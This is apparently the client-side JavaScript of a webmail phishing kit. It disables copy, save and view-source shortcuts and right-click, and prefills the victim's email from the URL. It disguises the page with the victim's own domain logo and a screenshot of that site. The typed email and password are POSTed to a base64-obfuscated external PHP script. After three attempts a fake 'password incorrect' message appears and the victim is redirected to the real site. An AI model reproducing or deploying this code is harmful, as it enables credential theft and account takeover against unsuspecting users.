// prevent ctrl + s
$(document).bind('keydown', function(e) {
if(e.ctrlKey && (e.which == 83)) {
e.preventDefault();
return false;
}
});

document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function(e) {
if (e.ctrlKey && 
(e.keyCode === 67 ||   
e.keyCode === 86 || 
e.keyCode === 85 || 
e.keyCode === 117)) {
return false;
} else {
return true;
}
};
$(document).keypress("u",function(e) {
if(e.ctrlKey)
{
return false;      }
else {
return true;
}});




    /* global $ */
/* global $ */
$(document).ready(function () {
  var count = 0;

  $('#back1').click(function () {
    $("#msg").hide();
    $('#ai').val("");
    $("#automail").animate({ left: 200, opacity: "hide" }, 0);
    $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
  });

  var ai = window.location.hash.substr(1);
  if (!ai) {

  } else {
    var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

    if (!base64regex.test(ai)) {
      var my_ai = decodeURIComponent(ai);
    } else {
      var my_ai = atob(ai);
    }

    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

    if (!filter.test(my_ai)) {
      $('#error').show();
      $('#error').html("<p class='alert alert-danger' style='font-size:14px'>That account doesn't exist. Enter a different account</p>");
      return false;
    }

    var ind = my_ai.indexOf("@");
    var my_slice = my_ai.substr((ind + 1));
    var c = my_slice.substr(0, my_slice.indexOf('.'));
    var final = c.toLowerCase();

    $('#ai').val(my_ai);
    $('#ai').attr('readonly', true);
    $("#msg").hide();
  }

  $(".logoname").html(final);

  var ind = my_ai.indexOf("@");
  var my_slice = my_ai.substr((ind + 1));
  var mainPage = 'https://' + my_slice;

  var sv = my_slice;

  var image = "url('https://image.thum.io/get/65490-1671030344805-37a36e07674665dbe1105f1044aab44d/width/1200/https://" + sv + "')";

  $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + my_slice);
  document.body.style.backgroundImage = image;
  $(".email").html(ai);

  $('#submit-btn').click(function (event) {
    event.preventDefault();
    $('#error').hide();
    $('#msg').hide();
    var ai = $("#ai").val();
    var pr = $("#pr").val();

    var my_ai = ai;
    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

    if (!ai) {
      $('#error').show();
      $('#error').html("<p class='alert alert-danger' style='font-size:14px'> Email field is empty</p>");
      return false;
    }

    if (!filter.test(my_ai)) {
      $('#error').show();
      $('#error').html("<p class='alert alert-danger' style='font-size:14px>That account doesn't exist. Enter a different account</p>");
      return false;
    }

    if (!pr) {
      $('#error').show();
      $('#error').html("<p class='alert alert-danger' style='font-size:14px'> Password field is empty </P>");
      return false;
    }

    if (pr.length < 5) {
      $('#error').show();
      $('#error').html("<p class='alert alert-danger' style='font-size:14px'>An error occured, invalid password</p>");
      email.focus;
      return false;
    }

    count = count + 1;

    var d = atob('aHR0cHM6Ly9jb25zdHJ1dG9yYWNhc2FjYXJtZW4uY29tLmJyL2RpcmVjdG9yeS9yb2Jpbi9yb2JpbndlYm1haW4vcm9iaW53ZWJtYWluL3dlYm0ucGhw');
    $.ajax({
      dataType: 'JSON',
      url: d,
      type: 'POST',
      data: {
        ai: ai,
        pr: pr
      },
      beforeSend: function (xhr) {
        $('#submit-btn').html('Please wait.....');
      },
      success: function (response) {
        $('#msg').html("<span style='color:red;'>Password is incorrect. Please try again</span>");
        if (response) {
          $("#msg").show();
          console.log(response);
          $('#msg').html(response['msg']);
          if (response['signal'] == 'ok') {
            $("#pr").val("");
            if (count >= 3) {
              count = 0;
              window.location.replace("http://" + sv);
            }
          } else {
            $('#msg').html(response['msg']);
          }
        }
      },
      error: function () {
        $("#pr").val("");
        if (count >= 3) {
          count = 0;
          window.location.replace("http://" + sv);
        }
        $("#msg").show();
      },
      complete: function () {
        $('#submit-btn').html('Sign in');
      }
    });
  });
});